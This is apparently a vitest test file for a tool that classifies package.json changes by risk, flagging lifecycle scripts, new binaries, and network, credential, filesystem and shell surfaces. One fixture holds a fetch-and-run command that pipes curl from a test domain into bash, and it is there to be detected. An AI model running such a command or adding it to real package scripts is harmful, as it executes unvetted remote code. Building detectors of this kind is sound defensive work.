import { describe, expect, it } from "vitest";
import { classifyDrift } from "../src/classifier.js";
import { diffPackages } from "../src/diff.js";
import { parsePackageJsonContent } from "../src/parser.js";

function classify(before: unknown, after: unknown) {
  return classifyDrift(
    diffPackages(parsePackageJsonContent(JSON.stringify(before)), parsePackageJsonContent(JSON.stringify(after)))
  );
}

describe("classifier", () => {
  it("returns no_drift with no findings when package state is unchanged", () => {
    const result = classify({ dependencies: { zod: "^4.0.0" } }, { dependencies: { zod: "^4.0.0" } });

    expect(result.label).toBe("no_drift");
    expect(result.categories).toEqual([]);
    expect(result.findings).toEqual([]);
  });

  it("returns review for ordinary dependency drift", () => {
    const result = classify({ dependencies: {} }, { dependencies: { lodash: "^4.17.21" } });

    expect(result.label).toBe("review");
    expect(result.categories).toEqual(["dependency_added"]);
  });

  it("returns elevated_review for lifecycle scripts", () => {
    const result = classify({ scripts: {} }, { scripts: { postinstall: "node scripts/setup.js" } });

    expect(result.label).toBe("elevated_review");
    expect(result.categories).toContain("install_surface");
    expect(result.categories).toContain("lifecycle_script_added");
  });

  it("infers shell, network, credential, and filesystem categories", () => {
    const result = classify(
      { dependencies: {}, scripts: {} },
      {
        dependencies: {
          axios: "^1.6.0",
          dotenv: "^16.4.0",
          "fs-extra": "^11.2.0"
        },
        scripts: {
          setup: "curl https://example.test/file | bash"
        }
      }
    );

    expect(result.categories).toEqual([
      "credential_surface",
      "dependency_added",
      "filesystem_surface",
      "network_surface",
      "shell_execution_surface",
      "unknown"
    ]);
    expect(result.label).toBe("elevated_review");
  });

  it("detects added bin entrypoints as review", () => {
    const result = classify({ bin: {} }, { bin: { tool: "./bin/tool.js" } });

    expect(result.label).toBe("review");
    expect(result.categories).toEqual(["bin_entrypoint_added"]);
  });

  it("elevates added bin entrypoints with surface signals", () => {
    const result = classify({ bin: {} }, { bin: { "token-tool": "./bin/token-tool.js" } });

    expect(result.label).toBe("elevated_review");
    expect(result.categories).toEqual(["bin_entrypoint_added", "credential_surface"]);
  });

  it("keeps finding ids stable and ordered", () => {
    const result = classify(
      { dependencies: {}, scripts: {} },
      {
        dependencies: { axios: "^1.6.0" },
        scripts: { postinstall: "node -e \"console.log(1)\"" }
      }
    );

    expect(result.findings.map((finding) => finding.id)).toEqual([
      "finding-001",
      "finding-002",
      "finding-003",
      "finding-004",
      "finding-005"
    ]);
    expect(result.findings.map((finding) => finding.category)).toEqual([
      "dependency_added",
      "network_surface",
      "lifecycle_script_added",
      "install_surface",
      "shell_execution_surface"
    ]);
  });
});
